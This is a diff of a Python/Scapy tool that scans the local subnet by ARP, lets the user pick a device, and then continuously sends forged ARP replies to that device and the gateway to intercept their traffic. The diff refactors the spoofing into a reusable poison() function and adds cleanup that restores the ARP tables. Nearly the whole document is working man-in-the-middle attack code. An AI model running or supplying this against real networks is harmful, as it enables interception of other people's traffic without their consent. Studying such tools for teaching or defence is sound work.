@@ -7,8 +7,8 @@ import time
 
 def get_ip_range() -> str:
     """
-    Queries the native Linux networking stack to determine the active interface
-    and calculates the exact local subnet CIDR block.
+    Query the native Linux networking stack to determine the active interface
+    and calculate the local subnet CIDR block.
 
     Returns:
         str: The IPv4 network range in CIDR notation (e.g., '192.168.1.0/24').
@@ -36,15 +36,15 @@ def get_ip_range() -> str:
 
 def scan_network(ip_range: str) -> list[dict]:
     """
-    Executes a Layer 2 ARP broadcast scan across the specified IP range
-    to discover active hosts on the local network.
+    Execute a Layer 2 ARP broadcast scan across the specified IP range
+    to discover active hosts on the local network segment.
 
     Args:
         ip_range (str): The target network block in CIDR notation.
 
     Returns:
-        list[dict]: A list of dictionaries, where each dictionary contains
-                    the 'ip' and 'mac' address of an answering host.
+        list[dict[str, str]]: A list of dictionaries containing the verified
+        'ip' and 'mac' addresses of answering hosts.
     """
     devices_list = []
     timeout = 2
@@ -55,7 +55,7 @@ def scan_network(ip_range: str) -> list[dict]:
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
 
     arp_request_broadcast = broadcast / arp_request
-    answered_list, unanswered_list = srp(arp_request_broadcast, timeout=timeout, verbose=False)
+    answered_list, unanswered_list = srp(arp_request_broadcast, iface=interface, timeout=timeout, verbose=False)
 
     for sent_packet, received_packet in answered_list:
         device_dict = {"ip": received_packet.psrc, "mac": received_packet.hwsrc}
@@ -75,17 +75,20 @@ def scan_network(ip_range: str) -> list[dict]:
     return devices_list
 
 
-def cli_interface(active_list: list[dict]) -> None:
+def cli_interface(active_list: list[dict]) -> dict[str, str]:
     """
-    Provides a command-line interface for the user to safely select a target
-    from the list of discovered network devices. Handles input validation.
+    Provide a command-line interface for the user to select a target
+    from the list of discovered network devices with input validation.
 
     Args:
-        active_list (list[dict]): The list of discovered hosts from the network scan.
+        active_list (list[dict[str, str]]): Discovered hosts from the network scan.
+
+    Returns:
+        dict[str, str]: The selected target's identity pairing maps.
     """
     if not active_list:
         print("[-] No active devices found. Exiting.")
-        return
+        raise KeyboardInterrupt
 
     interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
 
@@ -103,74 +106,104 @@ def cli_interface(active_list: list[dict]) -> None:
         except ValueError:
             print('[-] Please enter a valid integer.')
 
-    print(f'[*] target selected, initiating mitm...\n')
-    initiate_mitm(active_list, target_index)
+    return active_list[target_index]
 
 
-def initiate_mitm(active_list: list[dict], index: int) -> None:
+def poison(operation: int, destination_ip: str, destination_mac: str,
+           source_ip: str, source_mac: str, active_interface: str) -> None:
     """
-    Executes the Man-in-the-Middle ARP poisoning loop. Enables IP forwarding
-    and continuously sends forged ARP replies to both the target and the gateway
-    to intercept traffic.
+        Construct and transmit an individual Layer 2 Ethernet frame wrapping
+        an operational ARP mapping payload.
+
+        Args:
+            operation (int): The ARP opcode standard (e.g., 1 for request, 2 for reply).
+            destination_ip (str): Target protocol address field.
+            destination_mac (str): Target physical hardware address destination destination.
+            source_ip (str): Declared protocol origin address mapping.
+            source_mac (str): Declared hardware origin address assignment.
+            active_interface (str): The name of the local network interface to bind and emit through.
+    """
+    poison_target = Ether(dst=destination_mac) / ARP(
+        op=operation,
+        pdst=destination_ip,
+        hwdst=destination_mac,
+        psrc=source_ip,
+        hwsrc=source_mac
+    )
+    sendp(poison_target, iface=active_interface, verbose=False)
+
+
+def initiate_mitm(target: dict[str, str]) -> None:
+    """
+    Execute the active ARP spoofing loop for the specified target.
+
+    This function dynamically enables local IPv4 forwarding via the kernel
+    and continuously transmits spoofed ARP replies to intercept traffic
+    between the target device and the default gateway.
 
     Args:
-        active_list (list[dict]): The list of discovered hosts on the network.
-        index (int): The index of the target chosen by the user in the CLI.
+        target (dict[str, str]): A dictionary containing the target's network
+                                 identities. Must include 'ip' and 'mac' keys.
     """
+    if target is not None:
+        print(f'[*] target selected, initiating mitm...\n')
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        arp_reply = 2
+        loop_delay = 1  # seconds
 
-    arp_reply = 2
-    loop_delay = 1  # seconds
+        target_ip = target["ip"]
+        target_mac = target["mac"]
 
-    target_ip = (active_list[index])["ip"]
-    target_mac = (active_list[index])["mac"]
+        interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
+        gateway_mac = getmacbyip(gateway_ip)
 
-    interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
-    gateway_mac = getmacbyip(gateway_ip)
+        own_mac_address = get_if_hwaddr(conf.iface)
+        active_interface = conf.iface.name
 
-    own_mac_address = get_if_hwaddr(conf.iface)
-    active_interface = conf.iface.name
-
-    while True:
-        poison_target = Ether(dst=target_mac) / ARP(
-            op=arp_reply,
-            pdst=target_ip,
-            hwdst=target_mac,
-            psrc=gateway_ip,
-            hwsrc=own_mac_address
-        )
-        sendp(poison_target, iface=active_interface, verbose=False)
-
-        poison_gateway = Ether(dst=gateway_mac) / ARP(
-            op=arp_reply,
-            pdst=gateway_ip,
-            hwdst=gateway_mac,
-            psrc=target_ip,
-            hwsrc=own_mac_address
-        )
-        sendp(poison_gateway, iface=active_interface, verbose=False)
-
-        time.sleep(loop_delay)
+        while True:
+            poison(arp_reply, target_ip, target_mac, gateway_ip, own_mac_address, active_interface)
+            poison(arp_reply, gateway_ip, gateway_mac, target_ip, own_mac_address, active_interface)
+            time.sleep(loop_delay)
 
 
-def cleanup() -> None:
+def cleanup(target: dict[str, str]) -> None:
     """
-    Gracefully terminates the interception state by disabling IP forwarding
-    on the local Linux kernel.
+    Gracefully terminate the application runtime state by resetting kernel
+    IP forwarding settings and flashing restorative network tables if required.
 
-    This ensures the host machine stops routing foreign packets, preventing
-    unintentional data leaks or network black holes after the script exits.
-    This is an idempotent system call; it safely forces the state to '0'
-    regardless of whether forwarding was previously active.
+    Args:
+        target (dict[str, str] | None): Target data payload context to restore,
+                or None if terminated prior to entry choice.
     """
     os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 
+    if target is not None:
+        arp_reply = 2
+        loop_delay = 0.1  # seconds
+
+        target_ip = target["ip"]
+        target_mac = target["mac"]
+
+        interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
+        gateway_mac = getmacbyip(gateway_ip)
+
+        active_interface = conf.iface.name
+
+        for i in range(7):
+            poison(arp_reply, target_ip, target_mac, gateway_ip, gateway_mac, active_interface)
+            poison(arp_reply, gateway_ip, gateway_mac, target_ip, target_mac, active_interface)
+
+            time.sleep(loop_delay)
+
 
 if __name__ == "__main__":
+    user_selection = None
     try:
         active_network = scan_network(get_ip_range())
-        cli_interface(active_network)
+        user_selection = cli_interface(active_network)
+        initiate_mitm(user_selection)
+
     except KeyboardInterrupt:
-        print(f'\n[*] Stopping...')
-        cleanup()
+        print('\n[*] Stopping application runtime safely...')
+        cleanup(user_selection)
